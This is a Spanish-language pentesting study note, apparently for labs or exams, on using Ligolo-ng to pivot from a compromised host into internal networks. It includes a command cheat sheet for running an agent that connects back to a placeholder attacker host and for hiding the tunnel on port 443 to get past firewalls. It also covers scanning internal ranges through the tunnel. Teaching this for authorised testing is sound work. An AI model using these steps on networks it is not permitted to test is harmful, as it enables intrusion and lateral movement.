---
tags:
  - pivoting
  - lateralmovement
---
## Conceptos Clave (TL;DR)

- Ligolo-ng sustituye a proxychains+SOCKS: crea una interfaz TUN (capa 3) en el atacante mediante un stack de red en userland (Gvisor). Las herramientas (nmap, NetExec, Evil-WinRM, Impacket, xfreerdp) funcionan de forma NATIVA sin prefijo proxychains y con mucho mejor rendimiento (~104-106 Mbit/s).
- Arquitectura proxy + agent: el PROXY (relay) corre en la maquina atacante y crea la TUN; el AGENT corre en el host comprometido y conecta de vuelta por TCP/TLS. Los paquetes a la TUN se traducen en Gvisor y se reinyectan como connect() en la red del agente.
- Privilegios: solo se necesita root/CAP_NET_ADMIN en el ATACANTE (para crear la TUN). El AGENTE NO necesita privilegios. Esa es la diferencia clave frente a una VPN tradicional.
- Soporta TCP, UDP e ICMP (echo). Permite ping y escaneo UDP (mas lento por falta de algunos mensajes de error ICMP).

## Herramientas Clave

- proxy (ligolo-proxy): binario en el atacante, crea la TUN y recibe sesiones de agentes.
- agent (ligolo-agent): binario en el host comprometido (pivote), conecta de vuelta al proxy.
- ip tuntap / ip link / ip route: gestion manual de la interfaz TUN y rutas en Linux.
- nmap: escaneo directo a traves de la TUN (usar --unprivileged o -PE).
- Wintun.dll (driver de WireGuard): necesario para agent/proxy en Windows.

## Metodologia Paso a Paso

1. Instalacion (atacante y pivote). Descargar binarios precompilados v0.8.3 (recomendado) o compilar desde Go >= 1.20. En Windows hace falta wintun.dll en la misma carpeta que el binario.
2. Crear la interfaz TUN en el atacante. Necesario antes de enrutar; sin TUN no hay traduccion de paquetes. Se puede hacer desde la consola del proxy (interface_create) o manualmente con ip tuntap.
3. Arrancar el proxy con certificado autofirmado (-selfcert) para lab/examen. Anota el fingerprint para que el agente lo valide y evitar -ignore-cert.
4. Transferir y ejecutar el agent en el pivote (scp, python http.server, certutil...). El agente conecta de vuelta al proxy por el puerto 11601 (o el que definas).
5. Seleccionar la sesion, ver redes internas (ifconfig) y enrutar. autoroute (v0.8) detecta subredes, crea interfaz y arranca el tunel automaticamente; o se hace manual con route_add + tunnel_start.
6. Verificar conectividad y escanear directamente, sin proxychains.

## Cheat Sheet de Comandos

```bash
# --- INSTALACION: Proxy en el atacante (Linux amd64) ---
# wget descarga el release; tar -xzf descomprime; chmod +x da permiso de ejecucion
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.3/ligolo-ng_proxy_0.8.3_linux_amd64.tar.gz
tar -xzf ligolo-ng_proxy_0.8.3_linux_amd64.tar.gz
chmod +x proxy

# --- Agent para pivote Linux amd64 ---
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.3/ligolo-ng_agent_0.8.3_linux_amd64.tar.gz
tar -xzf ligolo-ng_agent_0.8.3_linux_amd64.tar.gz && chmod +x agent

# --- Agent para pivote Windows: descargar el release _windows_amd64.zip correspondiente ---
```

```bash
# --- COMPILAR DESDE CODIGO (Go >= 1.20) ---
git clone https://github.com/nicocha30/ligolo-ng && cd ligolo-ng
go build -o agent cmd/agent/main.go
go build -o proxy cmd/proxy/main.go

# Cross-compile para Windows (GOOS define el sistema destino)
GOOS=windows go build -o agent.exe cmd/agent/main.go
GOOS=windows go build -o proxy.exe cmd/proxy/main.go
```

```bash
# --- PASO 1: Crear la interfaz TUN en el atacante ---
# Metodo moderno: dentro de la consola del proxy (v0.6+), --name nombra la interfaz
ligolo-ng » interface_create --name ligolo

# Metodo manual clasico: crea TUN propiedad de tu usuario y la levanta
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
```

```bash
# --- PASO 2: Arrancar el proxy ---
# -selfcert genera certificado autofirmado (ideal para lab/examen)
./proxy -selfcert

# -laddr fija IP:puerto de escucha; usar 443 para camuflar entre firewalls
./proxy -selfcert -laddr 0.0.0.0:443
```

```bash
# --- Obtener el fingerprint del certificado (para conexion segura) ---
ligolo-ng » certificate_fingerprint
# Devuelve un SHA256 que pasaras al agente con -accept-fingerprint
```

```bash
# --- PASO 3: Ejecutar el agent en el pivote ---
# Linux: -connect apunta al proxy; -ignore-cert salta validacion TLS (rapido en lab)
./agent -connect <ATTACKER_IP>:11601 -ignore-cert

# Conexion segura: validar fingerprint en vez de ignorar el certificado
./agent -connect <ATTACKER_IP>:11601 -accept-fingerprint <FINGERPRINT_SHA256>

# Windows
agent.exe -connect <ATTACKER_IP>:11601 -ignore-cert
```

```bash
# --- PASO 4: Seleccionar sesion, ver redes y enrutar ---
ligolo-ng » session
# Elige el numero de sesion del agente (1, 2, ...)

[Agent : <USER>@<HOST>] » ifconfig
# Lista interfaces y subredes internas alcanzables por el pivote

# A) autoroute (v0.8): detecta subredes, crea interfaz y arranca el tunel guiado
[Agent : <USER>@<HOST>] » autoroute

# B) Manual desde consola: route_add anade la ruta, tunnel_start activa el tunel
[Agent : <USER>@<HOST>] » route_add --name ligolo --route <INTERNAL_SUBNET>
[Agent : <USER>@<HOST>] » tunnel_start --tun ligolo

# C) Manual con ip (alternativa) + tunnel_start despues
sudo ip route add <INTERNAL_SUBNET> dev ligolo
```

```bash
# --- PASO 5: Verificar y escanear (sin proxychains) ---
# Comprobacion de conectividad por ICMP a traves del tunel
ping -c2 <TARGET_IP>

# Ping sweep directo del rango interno
nmap -sn <INTERNAL_RANGE>

# Escaneo de puertos: -Pn omite host discovery, --unprivileged fuerza connect scan
nmap -Pn --unprivileged -p- <TARGET_IP>

# Ping sweep alternativo en bash puro
for i in $(seq 1 254); do (ping -c1 -W1 <INTERNAL_PREFIX>.$i | grep "bytes from" &); done
```

## "Gotchas" y Troubleshooting

- nmap SYN scan se convierte en connect scan porque el agente sin privilegios no reenvia paquetes raw. Usa --unprivileged o -PE para evitar falsos positivos. -sU (UDP) funciona pero es lento.
- Windows: el agente y el proxy necesitan el driver Wintun. Coloca wintun.dll (arquitectura correcta) en la misma carpeta que el binario.
- CORRECCION sobre flags: el agente NO tiene --socks, --socks-user ni --socks-pass. Para salir por un proxy corporativo se usa -proxy socks://... o -proxy http://... No existe flag "websocket" separado: se activa en el PROXY con prefijo http(s):// en -laddr.
- CORRECCION: no existe -webui (el WebUI se sirve por -api-laddr) ni -tun-ip (la TUN se crea con interface_create).
- Puerto por defecto del proxy: 11601. Si un firewall lo bloquea, levanta el proxy en 443 (-laddr 0.0.0.0:443).
- Requisito previo: sudo sin password para ip tuntap / ip route en tu caja, o no podras crear la TUN.
- Issue #14: con escaneos agresivos (ej. -p- -sT -Pn -T5) todas las conexiones TCP pueden empezar a fallar tras ~10 min. Solucion: agente con -retry / reconexion y bajar el timing (no -T5).
- Incluido en Kali desde 2024.2 (apt install ligolo-ng), pero se recomienda el binario precompilado mas reciente del repo.